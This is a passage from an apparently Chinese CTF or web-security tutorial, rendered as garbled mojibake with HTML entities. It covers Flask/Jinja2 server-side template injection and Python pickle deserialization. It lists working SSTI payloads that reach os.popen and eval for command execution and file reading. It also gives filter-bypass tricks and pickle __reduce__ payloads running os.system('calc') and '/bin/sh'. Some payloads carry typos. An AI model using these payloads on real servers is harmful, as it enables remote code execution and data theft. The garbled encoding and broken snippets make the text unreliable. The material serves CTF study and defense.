æ‹¿åˆ°åŸºç±»çš„æ‰€æœ‰å­ç±»\n&#123;&#123;\"\".__class__.__base__.__subclasses__()&#125;&#125;\nç¬¬å››æ­¥ å¯»æ‰¾æˆ‘ä»¬è¦åˆ©ç”¨çš„osç±»\nè¿™é‡Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°osç±»çš„ä¸‹æ ‡, æˆ‘ä»¬å¯ä»¥é‡‡ç”¨æ•°,çš„æ–¹å¼, å¯ä»¥ä½¿ç”¨æ–‡æœ¬ç¼–è¾‘è½¯ä»¶ctrl+f\nç¬¬äº”æ­¥ æ‰¾åˆ°å¯åˆ©ç”¨çš„ç±»çš„ä¸‹æ ‡å, å°±èƒ½çŸ¥é“å…¶æ–¹æ³•\nä½¿ç”¨__init__æ–¹æ³•å¯¹ç±»è¿›è¡Œåˆå§‹åŒ–\n&#123;&#123;&quot;&quot;.__class__.__base__[0].__subclasses__()[132].__init__&#125;&#125;\n\nç„¶åå†è°ƒç”¨__globals__è·å–åˆ°æ–¹æ³•å†…ä»¥å­—å…¸çš„å½¢å¼è¿”å›çš„æ–¹æ³•/å±æ€§ç­‰\n&#123;&#123;&quot;&quot;.__class__.__base__[0].__subclasses__()[132].__init__.__globals__&#125;&#125;\n\nç„¶åå°±å¯ä»¥é€šè¿‡æ•°ç»„keyæ‹¿åˆ°å¯¹åº”çš„æ–¹æ³•äº†, è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨shellæ‰§è¡Œæ–¹æ³•popen\n&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;ls /&#x27;).read()&#125;&#125;\n\n\nå‰é¢æ‰€è¯´çš„ç›¸å½“äºå‘½ä»¤æ‰§è¡Œ, ä¸‹é¢ä»‹ç»ä¸€ç§ä»£ç æ‰§è¡Œæ–¹æ³•\nä½¿ç”¨uiltinsç±»çš„evalæ–¹æ³•æ„é€ \n&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;)&#125;&#125;\n\nflaskçš„sstiçš„è¿‡æ»¤ä¸ç»•è¿‡ç»•è¿‡.è¿‡æ»¤\nä½¿ç”¨[]ç»•è¿‡ \n&#123;&#123;&quot;&quot;.__class__&#125;&#125;=&#123;&#123;&quot;&quot;[&#x27;__class__&#x27;]&#125;&#125;\nattrè¿‡æ»¤å™¨ç»•è¿‡\n&#123;&#123;&quot;&quot;.__class__&#125;&#125;=&#123;&#123;&quot;&quot;|attr(&#x27;__class__&#x27;)&#125;&#125;\n\nç»•è¿‡_è¿‡æ»¤\næ„é€ _å‡ºæ¥\n&#123;% set a=(()|select|string|list).pop(24)%&#125;&#123;%print(a)%&#125;\n16è¿›åˆ¶ç¼–ç ç»•è¿‡\n&#123;&#123;()[&quot;\\x5f\\x5fcalss\\x5f\\x5f&quot;]&#125;&#125; = &#123;&#123;().__class__&#125;&#125;\n\nç»•è¿‡[]è¿‡æ»¤å¯ä»¥ä½¿ç”¨__getitem__é­”æœ¯æ–¹æ³•, å®ƒçš„ä½œç”¨ç®€å•è¯´å°±æ˜¯æŠŠä¸­æ‹¬å·è½¬åŒ–ä¸ºæ‹¬å·çš„å½¢å¼\n__base__[0]=__base__.getitem__(0)\n\nç»•è¿‡\\&#123;\\&#123;è¿‡æ»¤å¯ä»¥åˆ©ç”¨jinja2çš„è¯­æ³•, ç”¨\\&#123;%æ¥è¿›è¡Œrce\n&#123;%&quot;&quot;.__class__.__base__.__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;ls /&#x27;).read()&#125;\n\nè¿˜å¯ä»¥åˆ©ç”¨forå¾ªç¯\n&#123;%for i in &#x27;&#x27;.__class__.__base__.__subclasses__()%)&#125;&#123;%for i.__name__ == &#x27;_wrp_close&#x27;%&#125;&#123;%print i.__init__.globals__[&#x27;popen&#x27;](&#x27;ls /&#x27;).read()%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;\n\nç»•è¿‡å•/åŒå¼•å·è¿‡æ»¤å¯ä»¥é‡‡ç”¨request.args.aç„¶åç»™aèµ‹å€¼çš„æ–¹å¼è¿›è¡Œç»•è¿‡\n&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[132].__init__.__globals__[request.args.a](request.args.b).read()&#125;&#125;\n\n\nargsè¢«banäº†å¯ä»¥ç”¨request.cookieä¼ªé€ \nç»•è¿‡æ•°å­—è¿‡æ»¤å¦‚æœæ•°å­—0-9è¢«banäº†, å¯ä»¥é€šè¿‡countæ¥å¾—åˆ°æ•°å­—\n&#123;&#123;(dict(e=a)|join|count&#125;&#125;+&#123;&#123;(dict(e=a)|join|count&#125;&#125;\n\nè¿™æ ·å°±èƒ½é€šè¿‡1+1æ¥æ„é€ å‡º2\nå¯ä»¥ç”¨å…¨è§’å­—ç¬¦ç»•è¿‡ä¾‹å¦‚å¯ä»¥é€šè¿‡è¿™ä¸ªç½‘ç«™æ‹¿åˆ°å…¨è§’æ•°å­—\nï¼‘ï¼’ï¼“ï¼”ï¼•ï¼–ï¼—ï¼˜ï¼™ï¼\n\nç»•è¿‡å…³é”®å­—classã€baseè¿™ç§å…³é”®è¯è¢«è¿‡æ»¤çš„æƒ…å†µ, é€šå¸¸ä½¿ç”¨joinæ‹¼æ¥å®ç°\næ¯”å¦‚:\n&#123;&#123;dict(__in=a,it__=a)|join&#125;&#125;= __init__\n\nSSTI_payload1ã€ä»»æ„å‘½ä»¤æ‰§è¡Œ&#123;%for i in &#x27;&#x27;.__class__.__base__.__subclasses__()%&#125;&#123;%if i.__name__ ==&#x27;_wrap_close&#x27;%&#125;&#123;%print i.__init__.__globals__[&#x27;popen&#x27;](&#x27;dir&#x27;).read()%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;2ã€ä»»æ„å‘½ä»¤æ‰§è¡Œ&#123;&#123;&quot;&quot;.__class__.__bases__[0]. __subclasses__()[138].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()&#125;&#125;//è¿™ä¸ª138å¯¹åº”çš„ç±»æ˜¯os._wrap_closeï¼Œåªéœ€è¦æ‰¾åˆ°è¿™ä¸ªç±»çš„ç´¢å¼•å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªpayload3ã€ä»»æ„å‘½ä»¤æ‰§è¡Œ&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;)&#125;&#125;4ã€ä»»æ„å‘½ä»¤æ‰§è¡Œ&#123;&#123;x.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;)&#125;&#125;//xçš„å«ä¹‰æ˜¯å¯ä»¥ä¸ºä»»æ„å­—æ¯ï¼Œä¸ä»…ä»…é™äºx5ã€ä»»æ„å‘½ä»¤æ‰§è¡Œ&#123;&#123;config.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;)&#125;&#125;6ã€æ–‡ä»¶è¯»å–&#123;&#123;x.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/flag&#x27;, &#x27;r&#x27;).read()&#125;&#125;//xçš„å«ä¹‰æ˜¯å¯ä»¥ä¸ºä»»æ„å­—æ¯ï¼Œä¸ä»…ä»…é™äºx\n\npythonååºåˆ—åŒ–è¿™éƒ¨åˆ†å‚è€ƒäº†è¿™ä½å¤§ä½¬çš„æ–‡ç« \nç®€ä»‹pythonçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ˜¯å°†ä¸€ä¸ªç±»å¯¹è±¡å‘å­—èŠ‚æµè½¬åŒ–ä»è€Œè¿›è¡Œå­˜å‚¨å’Œä¼ è¾“, ç„¶åä½¿ç”¨çš„æ—¶å€™å†å°†å­—èŠ‚æµè½¬æ¢å›åŸå§‹çš„å¯¹è±¡çš„ä¸€ä¸ªè¿‡ç¨‹å’Œphpçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–å…¶å®å·®ä¸å¤š, pythonä¸­ååºåˆ—åŒ–ä¸€èˆ¬æœ‰ä¸¤ç§æ–¹å¼:pickleå’Œjsonæ¨¡å—, å‰è€…æ˜¯pythonç‰¹æœ‰çš„æ ¼å¼, åè€…æ˜¯jsoné€šç”¨çš„æ ¼å¼\nç›¸è¾ƒäºphpååºåˆ—åŒ–çš„çµæ´»å¤šæ ·çš„åˆ©ç”¨, pythonååºåˆ—åŒ–ä¸»è¦æ¶‰åŠè¿™ä¹ˆå‡ ä¸ªæ¦‚å¿µ:pickle,pvm,__reduce__é­”æœ¯æ–¹æ³•, æœ¬æ–‡ä¸»è¦æ¥çœ‹pickleæ¨¡å—çš„ååºåˆ—åŒ–æ¼æ´é—®é¢˜\npickleå¯ä»¥ç”¨äºpythonç‰¹æœ‰çš„ç±»å‹å’Œpythonçš„æ•°æ®ç±»å‹ä¹‹é—´è¿›è¡Œè½¬æ¢(æ‰€æœ‰pythonæ•°æ®ç±»å‹)\npythonæä¾›ä¸¤ä¸ªæ¨¡å—å®ç°åºåˆ—åŒ–: cpickleå’Œpickle è¿™ä¸¤ä¸ªæ¨¡å—åŠŸèƒ½æ˜¯ä¸€æ ·çš„, åŒºåˆ«åœ¨äºcpickleæ˜¯Cè¯­è¨€å†™çš„, é€Ÿåº¦å¿«, pickleæ˜¯pythonå†™çš„, é€Ÿåº¦æ…¢. åœ¨python3ä¸­å·²ç»æ²¡æœ‰cpickleæ¨¡å—, pickleæœ‰å¦‚ä¸‹å››ç§å‡½æ•°æ“ä½œæ–¹æ³•\n\npickle.dump(obj,file) : å°†å¯¹è±¡åºåˆ—åŒ–åä¿å­˜åˆ°æ–‡ä»¶\npickle.load(file) : è¯»å–æ–‡ä»¶, å°†æ–‡ä»¶ä¸­çš„åºåˆ—åŒ–å†…å®¹ååºåˆ—åŒ–ä¸ºå¯¹è±¡\npickle.dumps(obj) : å°†å¯¹è±¡åºåˆ—åŒ–æˆå­—ç¬¦ä¸²æ ¼å¼çš„å­—èŠ‚æµ\npickle.loads(bytes_obj) : å°†å­—ç¬¦ä¸²æ ¼å¼çš„å­—èŠ‚æµååºåˆ—åŒ–ä¸ºå¯¹è±¡\n\né­”æœ¯æ–¹æ³•:\n\nreduce() ååºåˆ—åŒ–æ—¶è°ƒç”¨\nreduce_ex() ååºåˆ—åŒ–æ—¶è°ƒç”¨\nsetstate() ååºåˆ—åŒ–æ—¶è°ƒç”¨\ngetstate() ååºåˆ—åŒ–æ—¶è°ƒç”¨\n\nç®€å•å®ç”¨ä¾‹å­ä¸€\nimport pickleclass Demo():    def __init__(self, name=&#x27;charmersix&#x27;):        self.name = nameprint(&#x27;åºåˆ—åŒ–&#x27;)a = pickle.dumps(Demo())print(a)print(&#x27;ååºåˆ—åŒ–&#x27;)b = pickle.loads(pickle.dumps(Demo())).nameprint(b)\n\n\nä¾‹å­äºŒ\nimport pickleimport osclass A(object):    def __reduce__(self):        print(&#x27;ååºåˆ—åŒ–è°ƒç”¨&#x27;)        return (os.system,(&#x27;calc&#x27;,))#ååºåˆ—åŒ–é­”æœ¯æ–¹æ³•è°ƒç”¨__reduce__()a = A()p_d = pickle.dumps(a)#åºåˆ—åŒ–pickle.loads(p_d)#ååºåˆ—åŒ–å¹¶è°ƒç”¨__reduce__print(p_d)\n\n\n\n\nåœ¨ç¬¬å…­è¡Œä¸­ï¼Œé€—å·çš„ä½œç”¨æ˜¯å°†å…ƒç»„ä¸­çš„ä¸¤ä¸ªå…ƒç´ åˆ†å¼€ï¼Œä»¥ä¾¿ä½œä¸ºå‚æ•°ä¼ é€’ç»™__reduce__æ–¹æ³•ã€‚è¿™ä¸ªå…ƒç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯ä¸€ä¸ªå¯è°ƒç”¨çš„å¯¹è±¡ï¼ˆå‡½æ•°æˆ–ç±»ï¼‰ï¼Œè€Œç¬¬äºŒä¸ªå…ƒç´ æ˜¯ä¸€ä¸ªå‚æ•°å…ƒç»„ï¼Œå…¶ä¸­åŒ…å«ä¼ é€’ç»™è¯¥å¯è°ƒç”¨å¯¹è±¡çš„å‚æ•°ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå…ƒç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯os.systemå‡½æ•°ï¼Œç¬¬äºŒä¸ªå…ƒç´ æ˜¯å­—ç¬¦ä¸²â€™calcâ€™ï¼Œè¡¨ç¤ºå°†åœ¨ååºåˆ—åŒ–æœŸé—´æ‰§è¡Œçš„å‘½ä»¤ã€‚\n\n\nä¾‹å­3\nimport pickleimport osclass SerializePerson():    def __init__(self, name):        self.name = name    def __setstate__(self ,name):        os.system(&#x27;calc&#x27;)tmp = pickle.dumps(SerializePerson(&#x27;tom&#x27;))print(tmp)pickle.loads(tmp)#ååºåˆ—åŒ–å¹¶è°ƒç”¨__setstate__\n\n\nPVMç»„æˆéƒ¨åˆ†pvmç”±ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆ:\n\næŒ‡ä»¤å¤„ç†å™¨: ä»æµä¸­è¯»å–opcodeå’Œå‚æ•°, å¹¶å¯¹å…¶è¿›è¡Œè§£é‡Šå¤„ç†. é‡å¤è¿™ä¸ªåŠ¨ä½œ, ç›´åˆ°é‡åˆ°.è¿™ä¸ªç»“æŸç¬¦ååœæ­¢, æœ€ç»ˆç•™åœ¨æ ˆé¡¶çš„å€¼å°†è¢«ä½œä¸ºååºåˆ—åŒ–å¯¹è±¡è¿”å›\næ ˆåŒº(stack): ç”±pythonçš„listå®ç°, è¢«ç”¨æ¥ä¸´æ—¶å­˜å‚¨æ•°æ®/å‚æ•°ä»¥åŠå¯¹è±¡, åœ¨ä¸æ–­çš„è¿›å‡ºæ ˆè¿‡ç¨‹ä¸­å®Œæˆå¯¹æ•°æ®æµçš„ååºåˆ—åŒ–æ“ä½œ, å¹¶æœ€ç»ˆåœ¨æ ˆé¡¶ç”Ÿæˆååºåˆ—åŒ–ç»“æœ\næ ‡ç­¾åŒº(memo): ç”±pythonçš„dictå®ç°, ä¸ºpvmçš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸæä¾›å­˜å‚¨\n\næ‰§è¡Œæµç¨‹é¦–å…ˆ, pvmä¼šæŠŠæºç ç¼–è¯‘æˆå­—èŠ‚ç , å­—èŠ‚ç æ˜¯pythonè¯­è¨€ç‰¹æœ‰çš„ä¸€ç§è¡¨ç°å½¢å¼, å®ƒä¸æ˜¯äºŒè¿›åˆ¶æœºå™¨ç , éœ€è¦è¿›ä¸€æ­¥ç¼–è¯‘æ‰èƒ½è¢«æœºå™¨æ‰§è¡Œ. å¦‚æœpythonè¿›ç¨‹åœ¨ä¸»æœºä¸Šæœ‰å†™å…¥æƒé™, é‚£ä¹ˆå®ƒä¼šæŠŠç¨‹åºå­—èŠ‚ç ä¿å­˜ä¸ºä¸€ä¸ªä»¥.pycä¸ºæ‰©å±•åçš„æ–‡ä»¶, å¦‚æœæ²¡æœ‰å†™å…¥æƒé™, åˆ™pythonè¿›ç¨‹ä¼šåœ¨å†…å­˜é©¬ä¸­ç”Ÿæˆå­—èŠ‚ç , åœ¨ç¨‹åºæ‰§è¡Œç»“æŸåè¢«è‡ªåŠ¨ä¸¢å¼ƒ\nä¸€èˆ¬æ¥è¯´, åœ¨æ„å»ºç¨‹åºæ—¶æœ€å¥½ç»™Pythonè¿›ç¨‹åœ¨ä¸»æœºä¸Šçš„å†™å…¥æƒé™, è¿™æ ·åªè¦æºä»£ç æ²¡æœ‰æ”¹å˜, ç”Ÿæˆçš„.pycæ–‡ä»¶å°±å¯ä»¥è¢«é‡å¤åˆ©ç”¨, æé«˜æ‰§è¡Œæ•ˆç‡, åŒæ—¶éšè—æºä»£ç \nç„¶å, Pythonè¿›ç¨‹ä¼šæŠŠç¼–è¯‘å¥½çš„å­—èŠ‚ç è½¬å‘åˆ°PVM(Pythonè™šæ‹Ÿæœº)ä¸­, PVMä¼šå¾ªç¯è¿­ä»£æ‰§è¡Œå­—èŠ‚ç æŒ‡ä»¤, ç›´åˆ°æ‰€æœ‰æ“ä½œè¢«å®Œæˆ\næŒ‡ä»¤é›†è¿™é‡Œè´´ä¸€ä¸‹å®˜æ–¹æ–‡æ¡£\nå½“å‰ç”¨äºpicklingçš„åè®®æœ‰6ç§, ä½¿ç”¨çš„åè®®ç‰ˆæœ¬è¶Šé«˜, è¯»å–ç”Ÿæˆçš„pickleæ‰€éœ€çš„pythonç‰ˆæœ¬è¶Šæ–°\n\nv0ç‰ˆåè®®æ˜¯åŸå§‹çš„äººç±»å¯è¯»åè®®, å¹¶ä¸”å‘åå…¼å®¹æ—©æœŸç‰ˆæœ¬çš„python\nv1ç‰ˆåè®®æ˜¯è¾ƒæ—©çš„äºŒè¿›åˆ¶æ ¼å¼, å®ƒä¹Ÿä¸æ—©æœŸç‰ˆæœ¬çš„pythonå…¼å®¹\nv2ç‰ˆåè®®æ˜¯åœ¨python2.3ä¸­å¼•å…¥çš„, å®ƒä¸ºå­˜å‚¨new-style classæä¾›äº†æ›´é«˜æ•ˆçš„æœºåˆ¶, å‚é˜…PEP 307\nv3ç‰ˆåè®®æ·»åŠ äºpython3.0, ä»–å…·æœ‰å¯¹byteså¯¹è±¡çš„æ˜¾ç¤ºæ”¯æŒ, ä¸”æ— æ³•è¢«python2.xæ‰“å¼€, è¿™æ˜¯ç›®å‰é»˜è®¤ä½¿ç”¨çš„åè®®, ä¹Ÿæ˜¯åœ¨è¦æ±‚ä¸å…¶ä»–python3ç‰ˆæœ¬å…¼å®¹æ—¶çš„æ¨èåè®®\nv4ç‰ˆåè®®æ·»åŠ äºpython3.4, å®ƒæ”¯æŒå­˜å‚¨éå¸¸å¤§çš„å¯¹è±¡, èƒ½å­˜å‚¨æ›´å¤šç§ç±»çš„å¯¹è±¡, è¿˜åŒ…æ‹¬ä¸€äº›é’ˆå¯¹æ•°æ®æ ¼å¼çš„ä¼˜åŒ–, å‚é˜…PEP 3154\nv5ç‰ˆåè®®æ·»åŠ äºpython3.8, å®ƒæ”¯æŒå¤–å¸¦æ•°æ®, åŠ é€Ÿå¸¦å†…æ•°æ®å¤„ç†\n\n# Pickle opcodes.  See pickletools.py for extensive docs.  The listing# here is in kind-of alphabetical order of 1-character pickle code.# pickletools groups them by purpose.MARK           = b&#x27;(&#x27;   # push special markobject on stackSTOP           = b&#x27;.&#x27;   # every pickle ends with STOPPOP            = b&#x27;0&#x27;   # discard topmost stack itemPOP_MARK       = b&#x27;1&#x27;   # discard stack top through topmost markobjectDUP            = b&#x27;2&#x27;   # duplicate top stack itemFLOAT          = b&#x27;F&#x27;   # push float object; decimal string argumentINT            = b&#x27;I&#x27;   # push integer or bool; decimal string argumentBININT         = b&#x27;J&#x27;   # push four-byte signed intBININT1        = b&#x27;K&#x27;   # push 1-byte unsigned intLONG           = b&#x27;L&#x27;   # push long; decimal string argumentBININT2        = b&#x27;M&#x27;   # push 2-byte unsigned intNONE           = b&#x27;N&#x27;   # push NonePERSID         = b&#x27;P&#x27;   # push persistent object; id is taken from string argBINPERSID      = b&#x27;Q&#x27;   #  &quot;       &quot;         &quot;  ;  &quot;  &quot;   &quot;     &quot;  stackREDUCE         = b&#x27;R&#x27;   # apply callable to argtuple, both on stackSTRING         = b&#x27;S&#x27;   # push string; NL-terminated string argumentBINSTRING      = b&#x27;T&#x27;   # push string; counted binary string argumentSHORT_BINSTRING= b&#x27;U&#x27;   #  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytesUNICODE        = b&#x27;V&#x27;   # push Unicode string; raw-unicode-escaped&#x27;d argumentBINUNICODE     = b&#x27;X&#x27;   #   &quot;     &quot;       &quot;  ; counted UTF-8 string argumentAPPEND         = b&#x27;a&#x27;   # append stack top to list below itBUILD          = b&#x27;b&#x27;   # call __setstate__ or __dict__.update()GLOBAL         = b&#x27;c&#x27;   # push self.find_class(modname, name); 2 string argsDICT           = b&#x27;d&#x27;   # build a dict from stack itemsEMPTY_DICT     = b&#x27;&#125;&#x27;   # push empty dictAPPENDS        = b&#x27;e&#x27;   # extend list on stack by topmost stack sliceGET            = b&#x27;g&#x27;   # push item from memo on stack; index is string argBINGET         = b&#x27;h&#x27;   #   &quot;    &quot;    &quot;    &quot;   &quot;   &quot;  ;   &quot;    &quot; 1-byte argINST           = b&#x27;i&#x27;   # build &amp; push class instanceLONG_BINGET    = b&#x27;j&#x27;   # push item from memo on stack; index is 4-byte argLIST           = b&#x27;l&#x27;   # build list from topmost stack itemsEMPTY_LIST     = b&#x27;]&#x27;   # push empty listOBJ            = b&#x27;o&#x27;   # build &amp; push class instancePUT            = b&#x27;p&#x27;   # store stack top in memo; index is string argBINPUT         = b&#x27;q&#x27;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte argLONG_BINPUT    = b&#x27;r&#x27;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 4-byte argSETITEM        = b&#x27;s&#x27;   # add key+value pair to dictTUPLE          = b&#x27;t&#x27;   # build tuple from topmost stack itemsEMPTY_TUPLE    = b&#x27;)&#x27;   # push empty tupleSETITEMS       = b&#x27;u&#x27;   # modify dict by adding topmost key+value pairsBINFLOAT       = b&#x27;G&#x27;   # push float; arg is 8-byte float encodingTRUE           = b&#x27;I01\\n&#x27;  # not an opcode; see INT docs in pickletools.pyFALSE          = b&#x27;I00\\n&#x27;  # not an opcode; see INT docs in pickletools.py# Protocol 2PROTO          = b&#x27;\\x80&#x27;  # identify pickle protocolNEWOBJ         = b&#x27;\\x81&#x27;  # build object by applying cls.__new__ to argtupleEXT1           = b&#x27;\\x82&#x27;  # push object from extension registry; 1-byte indexEXT2           = b&#x27;\\x83&#x27;  # ditto, but 2-byte indexEXT4           = b&#x27;\\x84&#x27;  # ditto, but 4-byte indexTUPLE1         = b&#x27;\\x85&#x27;  # build 1-tuple from stack topTUPLE2         = b&#x27;\\x86&#x27;  # build 2-tuple from two topmost stack itemsTUPLE3         = b&#x27;\\x87&#x27;  # build 3-tuple from three topmost stack itemsNEWTRUE        = b&#x27;\\x88&#x27;  # push TrueNEWFALSE       = b&#x27;\\x89&#x27;  # push FalseLONG1          = b&#x27;\\x8a&#x27;  # push long from &lt; 256 bytesLONG4          = b&#x27;\\x8b&#x27;  # push really big long_tuplesize2code = [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3]# Protocol 3 (Python 3.x)BINBYTES       = b&#x27;B&#x27;   # push bytes; counted binary string argumentSHORT_BINBYTES = b&#x27;C&#x27;   #  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes# Protocol 4SHORT_BINUNICODE = b&#x27;\\x8c&#x27;  # push short string; UTF-8 length &lt; 256 bytesBINUNICODE8      = b&#x27;\\x8d&#x27;  # push very long stringBINBYTES8        = b&#x27;\\x8e&#x27;  # push very long bytes stringEMPTY_SET        = b&#x27;\\x8f&#x27;  # push empty set on the stackADDITEMS         = b&#x27;\\x90&#x27;  # modify set by adding topmost stack itemsFROZENSET        = b&#x27;\\x91&#x27;  # build frozenset from topmost stack itemsNEWOBJ_EX        = b&#x27;\\x92&#x27;  # like NEWOBJ but work with keyword only argumentsSTACK_GLOBAL     = b&#x27;\\x93&#x27;  # same as GLOBAL but using names on the stacksMEMOIZE          = b&#x27;\\x94&#x27;  # store top of the stack in memoFRAME            = b&#x27;\\x95&#x27;  # indicate the beginning of a new frame# Protocol 5BYTEARRAY8       = b&#x27;\\x96&#x27;  # push bytearrayNEXT_BUFFER      = b&#x27;\\x97&#x27;  # push next out-of-band bufferREADONLY_BUFFER  = b&#x27;\\x98&#x27;  # make top of stack readonly\n\nä¸Šæ–‡è°ˆåˆ°äº†opcodeæ˜¯æœ‰å¤šä¸ªç‰ˆæœ¬çš„, åœ¨è¿›è¡Œåºåˆ—åŒ–æ—¶å¯ä»¥é€šè¿‡protocol=numæ¥é€‰æ‹©opcodeçš„ç‰ˆæœ¬, æŒ‡å®šçš„ç‰ˆæœ¬å¿…é¡»å°äºç­‰äº5.\næ¼æ´å‡ºç°ä½ç½®\né€šå¸¸åœ¨è§£æè®¤è¯token/sessionçš„æ—¶å€™, ç°åœ¨å¾ˆå¤šwebæœåŠ¡éƒ½åœ¨ä½¿ç”¨redis/mongodb/memcachedç­‰æ¥å­˜å‚¨sessionç­‰çŠ¶æ€ä¿¡æ¯\nå¯èƒ½å°†å¯¹è±¡pickleåå­˜å‚¨æˆç£ç›˜æ–‡ä»¶\nå¯èƒ½å°†å¯¹è±¡pickleååœ¨ç½‘ç»œä¸­ä¼ è¾“\n\n\nå…¶å®ï¼Œæœ€å¸¸è§çš„ä¹Ÿæ˜¯æœ€ç»å…¸çš„ä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„ç¬¬ä¸€ç‚¹ï¼Œä¹Ÿå°±æ˜¯ flask é…åˆ redis åœ¨æœåŠ¡ç«¯å­˜å‚¨ session çš„æƒ…æ™¯ï¼Œè¿™é‡Œçš„ session æ˜¯è¢« pickle åºåˆ—åŒ–è¿›è¡Œå­˜å‚¨çš„ï¼Œå¦‚æœä½ é€šè¿‡ cookie è¿›è¡Œè¯·æ±‚ sessionid çš„è¯ï¼Œsession ä¸­çš„å†…å®¹å°±ä¼šè¢«ååºåˆ—åŒ–ï¼Œçœ‹ä¼¼å¥½åƒæ˜¯æ²¡æœ‰ä»€ä¹ˆé—®é¢˜,å› ä¸º session æ˜¯å­˜å‚¨åœ¨ æœåŠ¡ç«¯çš„ï¼Œä½†æ˜¯ç»ˆç©¶æ˜¯æŠµä¸ä½ redis çš„æœªæˆæƒè®¿é—®ï¼Œå¦‚æœå‡ºç°æœªæˆæƒçš„è¯ï¼Œæˆ‘ä»¬å°±èƒ½é€šè¿‡ set è®¾ç½®è‡ªå·±çš„ session ,ç„¶åé€šè¿‡è®¾ç½® cookie å»è¯·æ±‚ session çš„è¿‡ç¨‹ä¸­æˆ‘ä»¬è‡ªå®šçš„å†…å®¹å°±ä¼šè¢«ååºåˆ—åŒ–ï¼Œç„¶åæˆ‘ä»¬å°±è¾¾åˆ°äº†æ‰§è¡Œä»»æ„å‘½ä»¤æˆ–è€…ä»»æ„ä»£ç çš„ç›®çš„\n\næ¼æ´åˆ©ç”¨æ–¹å¼æ¼æ´äº§ç”Ÿçš„åŸå› åœ¨äºå…¶å¯ä»¥å°†è‡ªå®šä¹‰çš„ç±»è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–, ååºåˆ—åŒ–åäº§ç”Ÿçš„å¯¹è±¡ä¼šåœ¨ç»“æŸæ—¶è§¦å‘__reduce__()å‡½æ•°ä»è€Œè§¦çŠ¯æ¶æ„ä»£ç \nç®€å•æ¥è¯´, __reduce__()é­”æœ¯æ–¹æ³•ç±»ä¼¼äºphpä¸­çš„__wakeup()æ–¹æ³•, åœ¨ååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨__reduce__()é­”æœ¯æ–¹æ³•\n\nå¦‚æœè¿”å›å€¼æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸², é‚£ä¹ˆå°†ä¼šå»å½“å‰ä½œç”¨åŸŸä¸­æŸ¥æ‰¾å­—ç¬¦ä¸²å€¼å¯¹åº”åå­—çš„å¯¹è±¡, å°†å…¶ååºåˆ—åŒ–åè¿”å›\nå¦‚æœè¿”å›çš„æ˜¯ä¸€ä¸ªå…ƒç»„, è¦æ±‚æ˜¯2-6ä¸ªå‚æ•°(python3.8æ–°åŠ å…¥å…ƒç»„çš„ç¬¬å…­é¡¹)\nç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¯è°ƒç”¨çš„å¯¹è±¡.\nç¬¬äºŒä¸ªæ˜¯è¯¥å¯¹è±¡æ‰€éœ€çš„å‚æ•°å…ƒç»„, å¦‚æœå¯è°ƒç”¨å¯¹è±¡ä¸æ¥å—å‚æ•°åˆ™å¿…é¡»æä¾›ä¸€ä¸ªç©ºå…ƒç»„.\nç¬¬ä¸‰ä¸ªæ˜¯ç”¨äºè¡¨ç¤ºå¯¹è±¡çš„çŠ¶æ€çš„å¯é€‰å…ƒç´ , å°†è¢«ä¼ ç»™å‰è¿°çš„__setstate__()æ–¹æ³•, å¦‚æœå¯¹è±¡æ²¡æœ‰æ­¤æ–¹æ³•, åˆ™è¿™ä¸ªå…ƒç´ å¿…é¡»æ˜¯å­—å…¸ç±»å‹å¹¶ä¼šè¢«æ·»åŠ è‡³__dict__å±æ€§ä¸­.\nç¬¬å››ä¸ªæ˜¯ç”¨äºè¿”å›è¿ç»­é¡¹çš„è¿­ä»£å™¨çš„å¯é€‰å…ƒç´ .\nç¬¬äº”ä¸ªæ˜¯ç”¨äºè¿”å›è¿ç»­é”®å€¼å¯¹çš„è¿­ä»£å™¨çš„å¯é€‰å…ƒç´ .\nç¬¬å…­ä¸ªæ˜¯ä¸€ä¸ªå¸¦æœ‰(obj, state)ç­¾åçš„å¯è°ƒç”¨å¯¹è±¡çš„å¯é€‰å…ƒç´ .\n\n\n\nåŸºæœ¬payloadimport osimport pickleclass Demo(object):    def __reduce__(self):        shell = &#x27;/bin/sh&#x27;        return (os.system,(shell,))demo = 